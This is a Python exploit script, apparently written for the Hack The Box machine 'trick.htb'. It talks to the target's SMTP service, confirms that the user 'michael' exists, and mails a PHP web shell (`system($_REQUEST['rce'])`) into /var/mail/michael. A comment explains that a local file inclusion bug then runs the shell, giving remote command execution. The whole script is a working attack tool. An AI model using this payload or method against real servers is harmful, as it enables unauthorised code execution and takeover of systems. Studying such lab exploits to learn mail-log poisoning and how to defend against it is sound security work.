#!/usr/bin/env python
# script automate the process of injecting PHP payload into /var/mail/michael via SMTP
# Use LFI bug to trigger the payload: /var/mail/michael&rce=<COMMAND>
#

import socket

user='michael'
domain='debian.localdomain'
target='trick.htb'
port=25

print("[+] Connecting To Target.....")
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect((target, port))


recv = soc.recv(1024).decode()
print("[+] Received:")
print(recv)

print("[+] Sending EHLO.....")
ehlo = "EHLO bingo."+domain+"\r\n"
soc.send(ehlo.encode())

print("[+] Received:")
print(soc.recv(1024).decode())

print("[+] Checking if user ("+user+") exist.....")
#VRFY michael@debian.localdomain
vrfy = "VRFY "+user+"@"+domain+"\r\n"
soc.send(vrfy.encode())

print("[+] Received:")
print(soc.recv(1024).decode())

print("[+] Setting our Email (pwn.bingo.io)....")
mail = "mail from:pwn.bingo.io\r\n"
soc.send(mail.encode())

print("[+] Received:")
print(soc.recv(1024).decode())

print("[+] Setting Receiver Email("+user+"@"+domain+")....")
rcpt = "rcpt to:"+user+"@"+domain+"\r\n"
soc.send(rcpt.encode())

print("[+] Received:")
print(soc.recv(1024).decode())

print("[+] Sending Pre-Mail....")
soc.send("data\r\n".encode())

print("[+] Received:")
print(soc.recv(1024).decode())

print("[+] Sending Payload....")
payload = """
Subject:You Have Been Pwned

<?php system($_REQUEST["rce"]); ?>
\r\n.\r\n
"""
soc.send(payload.encode())

print("[+] Received:")
print(soc.recv(1024).decode())

print("[+] Closing Connection...")
soc.close()
